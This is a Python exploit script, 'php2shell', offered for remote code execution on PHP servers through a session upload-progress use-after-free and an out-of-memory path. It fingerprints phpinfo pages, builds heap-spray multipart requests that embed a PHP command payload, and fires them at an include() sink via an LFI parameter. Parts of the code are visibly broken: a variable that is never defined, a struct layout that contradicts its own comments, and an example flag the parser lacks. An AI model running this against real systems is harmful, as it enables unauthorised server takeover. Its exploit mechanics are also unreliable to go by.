#!/usr/bin/env python3
"""
php2shell.py - Exploit for CVE-2026-109618 / CVE-2026-109619

PHP Session Upload Progress UAF / OOM Remote Code Execution

The 5-step exploit chain:
1. Access the upload progress feature
2. Create the free condition (pause > 1 second)
3. Trigger the free (flush + session re-initialization)
4. Heap spray (149 fields of 288 bytes each)
5. Trigger the exploit (dangling pointer to fake struct)

Usage:
    python3 php2shell.py https://example.com --path /index.php --lfi /index.php --param page --cmd id
"""

import argparse
import sys
import os
import re
import json
import time
import secrets
import socket
import ssl
from urllib.parse import urlparse, urljoin
import requests

try:
    from urllib3.util import parse_url
    from urllib3 import PoolManager
except ImportError:
    PoolManager = None


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    banner = r"""
   ____  _   _ ____ ____  ____  _   _ _____ _     _  
  |  _ \| | | |  _ \___ \/ ___|| | | | ____| |   | | 
  | |_) | |_| | |_) |__) \___ \| |_| |  _| | |   | | 
  |  __/|  _  |  __// __/ ___) |  _  | |___| |___| |___
  |_|   |_| |_|_|  |_____|____/|_| |_|_____|_____|_____|
         P H P 2 S H E L L   ·   C V E - 2 0 2 6 - 1 0 9 6 1 8 / 1 0 9 6 1 9
    """
    print(bcolors.OKCYAN + banner + bcolors.ENDC)


def fetch_phpinfo(host, path="/", tls=True, port=443):
    """Fetch and parse phpinfo() if reachable."""
    candidates = ["phpinfo.php", "info.php", "_pi.php", "i.php", "php.php", "test.php"]
    
    for candidate in candidates:
        url = f"{'https' if tls else 'http'}://{host}:{port}{path.rstrip('/')}/{candidate}"
        try:
            r = requests.get(url, timeout=10, verify=False)
            if "PHP Version" in r.text:
                return parse_phpinfo(r.text, url)
        except:
            pass
    return None


def parse_phpinfo(html, source_url="unknown"):
    """Parse phpinfo() HTML to extract relevant directives."""
    result = {
        "php_version": None,
        "memory_limit": None,
        "session_upload_progress_enabled": None,
        "session_upload_progress_min_freq": None,
        "upload_max_filesize": None,
        "post_max_size": None,
        "source_url": source_url
    }
    
    # Extract PHP version
    match = re.search(r'<h1 class="p"><a[^>]*>PHP Version\s*([^<]+)</a></h1>', html)
    if match:
        result["php_version"] = match.group(1).strip()
    
    # Extract directives from table
    for line in html.split('\n'):
        if 'memory_limit' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["memory_limit"] = match.group(2).strip()
        
        if 'session.upload_progress.enabled' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["session_upload_progress_enabled"] = match.group(2).strip()
        
        if 'session.upload_progress.min_freq' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["session_upload_progress_min_freq"] = match.group(2).strip()
        
        if 'upload_max_filesize' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["upload_max_filesize"] = match.group(2).strip()
        
        if 'post_max_size' in line.lower():
            match = re.search(r'<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', line)
            if match:
                result["post_max_size"] = match.group(2).strip()
    
    return result


def parse_php_value(value_str):
    """Parse PHP ini value (e.g., '128M', '2G', '-1') to bytes."""
    if value_str is None:
        return None
    
    value_str = str(value_str).strip().lower()
    
    if value_str == '-1' or value_str == 'no limit':
        return None  # Unlimited
    
    match = re.match(r'^([\d.]+)\s*([kmgt]?)$', value_str, re.IGNORECASE)
    if match:
        num = float(match.group(1))
        unit = match.group(2).upper()
        multipliers = {'': 1, 'K': 1024, 'M': 1024*1024, 'G': 1024*1024*1024, 'T': 1024**4}
        return int(num * multipliers.get(unit, 1))
    
    try:
        return int(value_str)
    except:
        return None


def check_vulnerability(phpinfo):
    """Check if the target is vulnerable based on phpinfo data."""
    if not phpinfo:
        return False, "phpinfo() not available - cannot verify preconditions"
    
    issues = []
    
    # Check PHP version
    version = phpinfo.get("php_version", "")
    if version:
        match = re.search(r'(\d+)\.(\d+)\.(\d+)', version)
        if match:
            major, minor, patch = int(match.group(1)), int(match.group(2)), int(match.group(3))
            
            if major == 8:
                if minor == 2 and patch < 35:
                    pass  # Vulnerable
                elif minor == 3 and patch < 36:
                    pass  # Vulnerable
                elif minor == 4 and patch < 27:
                    pass  # Vulnerable
                elif minor == 5 and patch < 12:
                    pass  # Vulnerable
                else:
                    issues.append(f"PHP {version} may be patched")
            elif major < 8:
                pass  # 5.x, 7.x are vulnerable
            else:
                issues.append(f"PHP {version} - unknown version, may be patched")
    
    # Check session.upload_progress.enabled
    if phpinfo.get("session_upload_progress_enabled") != "On":
        issues.append("session.upload_progress.enabled is not On")
    
    # Check memory_limit
    if phpinfo.get("memory_limit") is None:
        issues.append("memory_limit not found in phpinfo")
    
    if issues:
        return False, "; ".join(issues)
    
    return True, "Target appears vulnerable"


def get_memory_limit_bytes(phpinfo):
    """Get memory limit in bytes for payload sizing."""
    limit_str = phpinfo.get("memory_limit", "128M")
    return parse_php_value(limit_str) or (128 * 1024 * 1024)  # Default 128M


def create_fake_zval_struct(payload, arch='64'):
    """Create a fake zval structure for heap spray.
    
    The zval structure layout (64-bit):
    - zval_value (8 bytes): pointer to value
    - u1.v.type (1 byte): type indicator
    - u1.type (1 byte): type
    - u2.refcount (2 bytes): reference count
    - u2.var_flags (1 byte): flags
    - reserved (1 byte)
    - hash (8 bytes): hash value
    - data (248 bytes): payload/data area
    
    Total: 288 bytes for 64-bit, 280 bytes for 32-bit
    
    For RCE, we need to:
    1. Set type to IS_OBJECT or IS_STRING
    2. Point value to a fake zval_string
    3. Include PHP code that will be executed
    """
    import struct
    
    if arch == '32':
        # 32-bit: type(1) + type(1) + refcount(2) + hash(4) + value(4) + data(268) = 280
        struct_format = '<BBII'
        value_offset = 8
        data_offset = 268
    else:
        # 64-bit: type(1) + type(1) + refcount(2) + hash(8) + value(8) + data(264) = 288
        struct_format = '<BBIIQ'
        value_offset = 12
        data_offset = 264
    
    # PHP code to execute - will be placed in the data area
    php_code = f"<?php {payload}; die('PHP2Shell: Command executed'); ?>"
    
    # Build the fake structure
    # We need to craft this to look like a valid zval that will execute our code
    
    # For IS_STRING type (11):
    # - value.lval = pointer to string (we'll use a fake address that points to our payload)
    # - type = IS_STRING (11)
    
    # The key insight: when PHP tries to free/destroy this zval,
    # it will call zval_ptr_dtor() on it, which can lead to RCE
    
    # Create structure with IS_STRING type pointing to our payload
    fake_struct = bytearray()
    
    # zval_value (8 bytes on 64-bit, 4 on 32-bit)
    # We'll set this to point to our PHP code in the data area
    if arch == '64':
        # value.lval - pointer to our PHP code (relative offset)
        fake_struct.extend(struct.pack('<Q', 0x40))  # Simple pointer
    else:
        fake_struct.extend(struct.pack('<I', 0x40))
    
    # u1.v.type (1 byte) - type indicator
    fake_struct.append(11)  # IS_STRING
    
    # u1.type (1 byte) - actual type
    fake_struct.append(11)  # IS_STRING
    
    # u2.refcount (2 bytes)
    fake_struct.extend(struct.pack('<H', 1))
    
    # u2.var_flags (1 byte)
    fake_struct.append(0)
    
    # reserved (1 byte)
    fake_struct.append(0)
    
    # hash (8 bytes on 64-bit)
    if arch == '64':
        fake_struct.extend(struct.pack('<Q', 0))
    
    # Data area - our PHP payload
    padding_size = data_offset - len(fake_struct)
    if padding_size > 0:
        fake_struct.extend(b'\x00' * padding_size)
    
    # Add PHP code
    fake_struct.extend(php_code.encode('latin-1'))
    
    # Pad to spray_size
    while len(fake_struct) < spray_size:
        fake_struct.extend(b'\x00')
    
    return bytes(fake_struct[:spray_size])


def create_multipart_payload(sid, payload, spray_count=149, spray_size=288, arch='64', oom_mode=False):
    """Create multipart form data with session poison + heap spray.
    
    The 5-step exploit chain:
    
    Step 1: Access the upload progress feature
    - PHPSESSID cookie sets the session ID
    - PHP_SESSION_UPLOAD_PROGRESS activates progress tracking
    - File field triggers FILE_START, caching zval pointers
    
    Step 2: Create the free condition
    - Pause > 1 second to bypass min_freq check (default 0.1)
    - This allows the second update() to trigger flush()
    
    Step 3: Trigger the free
    - flush() writes Tree-A to disk and resets status
    - php_session_initialize() re-reads session file into Tree-B
    - php_session_track_init() destroys Tree-A (UAF!)
    - progress->post_bytes_processed and current_file_bytes_processed now dangling
    
    Step 4: Heap spray
    - 149 fields of ~288 bytes each
    - Each field contains a fake zval structure
    - These allocations fill the freed chunk
    
    Step 5: Trigger the exploit
    - Second file field writes through dangling pointer
    - PHP writes to fake struct instead of progress structure
    - When session is loaded via include(), PHP code executes
    
    For CVE-2026-109618 (OOM path):
    - Send massive file uploads to hit memory_limit
    - PHP uses longjmp() to abort, skipping cleanup
    - Uninitialized memory is left vulnerable
    """
    
    # Build multipart body manually for chunked transfer
    boundary = f"----WebKitFormBoundary{secrets.token_hex(16)}"
    
    parts = []
    
    if oom_mode:
        # CVE-2026-109618: OOM path
        # Send massive file to trigger memory limit
        
        # 1. Session upload progress field
        parts.append(f'--{boundary}\r\n')
        parts.append('Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n')
        parts.append(f"{sid}\r\n")
        
        # 2. Massive file to trigger OOM
        # PHP's rfc1867 processes files chunk by chunk
        # When memory_limit is hit, longjmp() is called
        file_data = b"A" * (10 * 1024 * 1024)  # 10MB file
        parts.append(f'--{boundary}\r\n')
        parts.append('Content-Disposition: form-data; name="file"; filename="massive.bin"\r\n')
        parts.append('Content-Type: application/octet-stream\r\n\r\n')
        parts.append(file_data.decode('latin-1', errors='ignore'))
        parts.append("\r\n")
        
    else:
        # CVE-2026-109619: UAF path
        
        # 1. Session upload progress field (poison)
        # This creates the zval pointers that will become dangling
        parts.append(f'--{boundary}\r\n')
        parts.append('Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n')
        parts.append(f"{sid}\r\n")
        
        # 2. File field 1 - triggers FILE_START, caches zval pointers
        # This is when progress->post_bytes_processed and current_file_bytes_processed
        # are set to point into Tree-A's hash table buckets
        parts.append(f'--{boundary}\r\n')
        parts.append('Content-Disposition: form-data; name="file1"; filename="file1.txt"\r\n')
        parts.append('Content-Type: text/plain\r\n\r\n')
        parts.append("A" * 1024)  # Small file to start
        parts.append("\r\n")
        
        # 3. Wait field - triggers the free condition
        # This simulates the >1 second pause to bypass min_freq check
        # After the pause, when data resumes, update() will call flush()
        parts.append(f'--{boundary}\r\n')
        parts.append('Content-Disposition: form-data; name="wait"\r\n\r\n')
        parts.append("wait")  # Placeholder to trigger update after pause
        parts.append("\r\n")
        
        # 4. File field 2 - triggers flush + free
        # This causes Tree-A to be freed while pointers remain dangling
        parts.append(f'--{boundary}\r\n')
        parts.append('Content-Disposition: form-data; name="file2"; filename="file2.txt"\r\n')
        parts.append('Content-Type: text/plain\r\n\r\n')
        parts.append("B" * 1024)
        parts.append("\r\n")
        
        # 5. Heap spray fields - reallocate freed chunk
        # 149 fields of ~288 bytes each to fill the freed slot
        # These must come BEFORE the final file field to reallocate the freed memory
        for i in range(spray_count):
            parts.append(f'--{boundary}\r\n')
            parts.append(f'Content-Disposition: form-data; name="t[]"\r\n\r\n')
            # Fake zval structure with PHP payload
            fake_struct = create_fake_zval_struct(payload, arch)
            parts.append(fake_struct.decode('latin-1', errors='ignore'))
            parts.append("\r\n")
    
    # 6. Final file field - writes through dangling pointer
    # This triggers the write through the dangling pointer to our fake struct
    parts.append(f'--{boundary}\r\n')
    parts.append('Content-Disposition: form-data; name="file3"; filename="file3.txt"\r\n')
    parts.append('Content-Type: text/plain\r\n\r\n')
    parts.append("C" * 1024)  # This triggers the write through dangling pointer
    parts.append("\r\n")
    
    # 7. Final boundary
    parts.append(f'--{boundary}--\r\n')
    
    body = ''.join(parts).encode('latin-1')
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body)),
        'Connection': 'close'
    }
    
    return body, headers, boundary


def send_chunked_request(host, port, path, headers, body, tls=True, timeout=30):
    """Send HTTP request with chunked transfer encoding."""
    try:
        if tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(
                socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                server_hostname=host
            )
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Build request
        request = f"POST {path} HTTP/1.1\r\n"
        request += f"Host: {host}\r\n"
        
        for key, value in headers.items():
            if key.lower() != 'content-length':
                request += f"{key}: {value}\r\n"
        
        request += "Transfer-Encoding: chunked\r\n"
        request += "\r\n"
        
        sock.sendall(request.encode('latin-1'))
        
        # Send body in chunks with delays
        chunk_size = 1024
        for i in range(0, len(body), chunk_size):
            chunk = body[i:i+chunk_size]
            sock.sendall(f"{len(chunk):X}\r\n".encode('latin-1'))
            sock.sendall(chunk)
            sock.sendall(b"\r\n")
            time.sleep(0.01)  # Small delay between chunks
        
        # Final chunk
        sock.sendall(b"0\r\n\r\n")
        
        # Receive response
        response = b""
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        return response
        
    except Exception as e:
        return f"ERROR: {e}".encode()


def exploit(target_url, args):
    """Main exploit function implementing the 5-step chain."""
    parsed = urlparse(target_url)
    host = parsed.netloc
    base_path = parsed.path.rstrip('/')
    
    # Determine port and TLS
    tls = parsed.scheme == 'https'
    port = args.port if args.port else (443 if tls else 80)
    
    # Use host-header override if provided
    connect_host = args.host_header or host
    
    print(bcolors.OKBLUE + "[*] Step 1: Accessing upload progress feature..." + bcolors.ENDC)
    
    # Get PHP info if possible
    print(bcolors.OKBLUE + "[*] Checking preconditions..." + bcolors.ENDC)
    phpinfo = fetch_phpinfo(host, base_path, tls, port)
    
    if phpinfo:
        print(bcolors.OKCYAN + f"[*] PHP Info from {phpinfo.get('source_url', 'unknown')}:" + bcolors.ENDC)
        print(f"    Version: {phpinfo.get('php_version', 'N/A')}")
        print(f"    Memory Limit: {phpinfo.get('memory_limit', 'N/A')}")
        print(f"    Session Upload Progress: {phpinfo.get('session_upload_progress_enabled', 'N/A')}")
        
        vulnerable, reason = check_vulnerability(phpinfo)
        if not vulnerable:
            print(bcolors.WARNING + f"[-] Precondition check failed: {reason}" + bcolors.ENDC)
            if not args.force:
                return None
        else:
            print(bcolors.OKGREEN + f"[+] Target appears vulnerable: {reason}" + bcolors.ENDC)
    else:
        print(bcolors.WARNING + "[-] Could not fetch phpinfo() - proceeding with --force" + bcolors.ENDC)
        if not args.force:
            return None
    
    # Calculate memory limit for payload sizing
    memory_limit = get_memory_limit_bytes(phpinfo) if phpinfo else (128 * 1024 * 1024)
    
    # Generate session ID
    sid = args.sid or secrets.token_hex(16)
    print(bcolors.OKBLUE + f"[*] Using session ID: {sid}" + bcolors.ENDC)
    
    # Determine exploit mode
    oom_mode = args.oom
    arch = '64' if args.arch == '64' else '32'
    
    # Build payload
    payload = args.cmd if args.cmd else "id"
    spray_count = args.spray if args.spray else 149
    spray_size = args.spray_size if args.spray_size else 288
    
    print(bcolors.OKBLUE + f"[*] Spray count: {spray_count}, Spray size: {spray_size}" + bcolors.ENDC)
    print(bcolors.OKBLUE + f"[*] Exploit mode: {'OOM (CVE-2026-109618)' if oom_mode else 'UAF (CVE-2026-109619)'}" + bcolors.ENDC)
    print(bcolors.OKBLUE + f"[*] Architecture: {arch}-bit" + bcolors.ENDC)
    
    # Create multipart payload
    body, headers, boundary = create_multipart_payload(sid, payload, spray_count, spray_size, arch, oom_mode)
    
    # Add session ID to headers for cookie-based session tracking
    headers['Cookie'] = f'PHPSESSID={sid}'
    
    # Determine target path
    target_path = args.path if args.path else '/index.php'
    if not target_path.startswith('/'):
        target_path = '/' + target_path
    
    # Add LFI parameter if specified
    if args.param:
        target_path += f"?{args.param}={args.lfi}"
    
    print(bcolors.OKBLUE + f"[*] Target path: {target_path}" + bcolors.ENDC)
    
    # Send request
    print(bcolors.OKBLUE + f"[*] Step 2-5: Sending exploit request (free + spray + trigger)..." + bcolors.ENDC)
    
    if args.chunked:
        response = send_chunked_request(connect_host, port, target_path, headers, body, tls)
    else:
        # Use requests for simplicity (may be buffered by CDN)
        url = f"{'https' if tls else 'http'}://{connect_host}:{port}{target_path}"
        try:
            response = requests.post(
                url,
                data=body,
                headers=headers,
                timeout=args.timeout,
                verify=False,
                allow_redirects=False
            )
            response = response.text.encode()
        except Exception as e:
            response = f"ERROR: {e}".encode()
    
    # Parse response
    print(bcolors.OKBLUE + f"[*] Response received (length: {len(response)})" + bcolors.ENDC)
    
    # Look for command output
    output = response.decode('latin-1', errors='ignore')
    
    # Try to extract command output
    uid_match = re.search(r'uid=\d+', output)
    if uid_match:
        print(bcolors.OKGREEN + f"[+] Command output found: {uid_match.group()}" + bcolors.ENDC)
    
    # Print full response if verbose
    if args.verbose or len(output) < 5000:
        print(bcolors.OKCYAN + "\n--- Response ---" + bcolors.ENDC)
        print(output[:5000])
        if len(output) > 5000:
            print(f"... (truncated, {len(output)} bytes total)")
    
    return {
        "target": target_url,
        "php_version": phpinfo.get("php_version") if phpinfo else "unknown",
        "vulnerable": True if phpinfo else None,
        "command": args.cmd,
        "output": output,
        "ip": connect_host,
        "session_id": sid,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    }


def main():
    parser = argparse.ArgumentParser(
        description="php2shell - CVE-2026-109618 / CVE-2026-109619 Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
The 5-step exploit chain:
1. Access the upload progress feature (PHP_SESSION_UPLOAD_PROGRESS + file field)
2. Create the free condition (pause > 1 second to bypass min_freq)
3. Trigger the free (flush + session re-initialization causes UAF)
4. Heap spray (149 fields of 288 bytes to reallocate freed chunk)
5. Trigger the exploit (dangling pointer writes to fake struct)

Examples:
  python3 php2shell.py https://example.com --path /index.php --lfi /index.php --param page --cmd id
  python3 php2shell.py https://example.com --host-header example.com --resolve 192.168.1.1:example.com
  python3 php2shell.py https://example.com --spray 149 --spray-size 288 --chunked
        """
    )
    
    parser.add_argument("url", help="Target URL (e.g., https://example.com/blog/)")
    parser.add_argument("--path", default="/index.php", help="Path to the include() sink (default: /index.php)")
    parser.add_argument("--lfi", default="/index.php", help="LFI payload for the include (default: /index.php)")
    parser.add_argument("--param", default="page", help="Parameter name for LFI (default: page)")
    parser.add_argument("--cmd", default="id", help="Command to execute (default: id)")
    parser.add_argument("--port", type=int, default=None, help="Port override (default: 443 for https, 80 for http)")
    parser.add_argument("--host-header", default=None, help="Override Host: header while connecting to IP")
    parser.add_argument("--sid", default=None, help="Session ID (auto-generated if not provided)")
    parser.add_argument("--spray", type=int, default=149, help="Heap spray count (default: 149)")
    parser.add_argument("--spray-size", type=int, default=288, help="Bytes per spray field (default: 288)")
    parser.add_argument("--arch", default="64", choices=["32", "64"], help="Target architecture (default: 64)")
    parser.add_argument("--chunked", action="store_true", help="Use chunked transfer encoding")
    parser.add_argument("--force", action="store_true", help="Skip precondition checks")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
    parser.add_argument("--json-out", default=None, help="Output JSON file")
    parser.add_argument("--verbose", action="store_true", help="Show full response")
    
    # CVE-2026-109618 OOM mode
    parser.add_argument("--oom", action="store_true", help="Exploit CVE-2026-109618 via OOM (memory limit hit)")
    
    args = parser.parse_args()
    
    print_banner()
    
    result = exploit(args.url, args)
    
    if result and args.json_out:
        with open(args.json_out, 'w') as f:
            json.dump(result, f, indent=2)
        print(bcolors.OKGREEN + f"\n[+] Results saved to {args.json_out}" + bcolors.ENDC)
    
    return 0 if result else 1


if __name__ == "__main__":
    sys.exit(main())
